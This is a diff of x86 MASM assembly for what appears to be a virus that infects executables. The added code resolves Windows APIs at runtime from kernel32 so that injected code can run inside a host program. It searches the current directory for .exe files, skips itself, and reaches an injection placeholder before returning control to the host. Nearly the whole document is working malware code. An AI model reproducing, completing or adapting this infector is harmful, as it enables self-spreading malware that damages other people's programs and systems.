@@ -20,8 +20,14 @@ option casemap:none
 .code
 
 data:
-	returnAddr          DWORD 000000000h
-	fileFilter          BYTE ".\*.exe",0
+	returnAddr              DWORD 000000000h
+	fileFilter              BYTE ".\*.exe",0
+	GetModuleFileName_str   BYTE "GetModuleFileNameA",0
+	FindFirstFile_str       BYTE "FindFirstFileA",0
+	FindNextFile_str        BYTE "FindNextFileA",0
+	FindClose_str           BYTE "FindClose",0
+	GetFullPathName_str     BYTE "GetFullPathNameA",0
+	lstrcmp_str             BYTE "lstrcmp",0
 
 start:
 	call get_eip ; get the injected .exe's environment instruction pointer
@@ -134,6 +140,7 @@ loop_find_gpa_end:
 	add edx, ebx
 	mov edx,[edx + edi]
 	add edx, ebx
+	mov eax, ebx ; save kernel32 base address
 
 	pop ebx
 	; allocate space on the stack, sp register instead of esp because
@@ -141,33 +148,47 @@ loop_find_gpa_end:
 	sub sp, sizeof STACK_STORAGE
 
 	; store GetProcAddress address
-	mov (STACK_STORAGE PTR [esp]).GPAAddr, edx
+	mov (STACK_STORAGE PTR [esp]).GetProcAddress_addr, edx
+	; store kernel32 base address
+	mov (STACK_STORAGE PTR [esp]).kernel32BaseAddr, eax
+
+	lea eax, [ebx + (GetModuleFileName_str - data)]
+	push eax
+	call GetProcAddr
 
 	lea edx, (STACK_STORAGE PTR [esp]).currentExe
 	push MAX_PATH
 	push edx
 	push NULL
-	call GetModuleFileName ; get current .exe full file path
+	call eax ; GetModuleFileName() / get current .exe full file path
+
+	lea eax, [ebx + (FindFirstFile_str - data)]
+	push eax
+	call GetProcAddr
 
 	lea edx, (STACK_STORAGE PTR [esp]).fileStruct
 	push edx
 	lea edx, [ebx + (fileFilter - data)]
 	push edx
-	call FindFirstFile
+	call eax ; FindFirstFile()
 
 	cmp eax, INVALID_HANDLE_VALUE
 	je loop_find_file_end
 
 	mov (STACK_STORAGE PTR [esp]).searchHandle, eax
 loop_find_file:
+	lea eax, [ebx + (GetFullPathName_str - data)]
+	push eax
+	call GetProcAddr
+
 	; check file and put it on the stack if needed
 	lea edx, (STACK_STORAGE PTR [esp]).targetName
-	lea eax, (WIN32_FIND_DATA PTR (STACK_STORAGE PTR [esp]).fileStruct).cFileName
+	lea ecx, (WIN32_FIND_DATA PTR (STACK_STORAGE PTR [esp]).fileStruct).cFileName
 	push NULL
 	push edx
 	push MAX_PATH
-	push eax
-	call GetFullPathName ; get absolute file path
+	push ecx
+	call eax ; GetFullPathName() / get absolute file path
 	
 	; check if it's a directory
 	mov edx, (WIN32_FIND_DATA PTR (STACK_STORAGE PTR [esp]).fileStruct).dwFileAttributes
@@ -175,11 +196,15 @@ loop_find_file:
 	cmp edx, FILE_ATTRIBUTE_DIRECTORY
 	je loop_find_file_continue
 
-	lea edx, (STACK_STORAGE PTR [esp]).targetName
-	lea eax, (STACK_STORAGE PTR [esp]).currentExe
-	push edx
+	lea eax, [ebx + (lstrcmp_str - data)]
 	push eax
-	call lstrcmp ; check if this is the program
+	call GetProcAddr
+	; check if this is the current program
+	lea edx, (STACK_STORAGE PTR [esp]).targetName
+	lea ecx, (STACK_STORAGE PTR [esp]).currentExe
+	push edx
+	push ecx
+	call eax ; lstrcmp()
 	cmp eax, 0
 	je loop_find_file_continue
 
@@ -192,23 +217,44 @@ loop_find_file:
 ;	injection "placeholder"
 	push 0AABBCCDDh
 	pop eax
-;
+;;
 
 loop_find_file_continue:
-	lea edx, (STACK_STORAGE PTR [esp]).fileStruct
-	mov eax, (STACK_STORAGE PTR [esp]).searchHandle
-	push edx
+	lea eax, [ebx + (FindNextFile_str - data)]
 	push eax
-	call FindNextFile
+	call GetProcAddr
+
+	lea edx, (STACK_STORAGE PTR [esp]).fileStruct
+	mov ecx, (STACK_STORAGE PTR [esp]).searchHandle
+	push edx
+	push ecx
+	call eax
 	cmp eax, TRUE
 	je loop_find_file
 loop_find_file_end:
-
 	mov eax, [ebx + (returnAddr - data)]
 	cmp eax, 0
 	je end_of_code
+	add sp, sizeof STACK_STORAGE ; "free" the stack
 	jmp eax
+
+; arg1: function name
+; ret : function address
+GetProcAddr:
+	; switch the two in the stack
+	pop eax
+	pop edx
+	push eax
+	push edx
+	; function name & address already in stack, hence the offsets on esp
+	push (STACK_STORAGE PTR [esp + 8]).kernel32BaseAddr
+	call (STACK_STORAGE PTR [esp + 0Ch]).GetProcAddress_addr
+	pop edx
+	jmp edx
+
 end_of_code:
+	add sp, sizeof STACK_STORAGE ; "free" the stack
+	; hard-coded call, so kernel32 is linked loaded in the infector
 	push 0
 	call ExitProcess
 
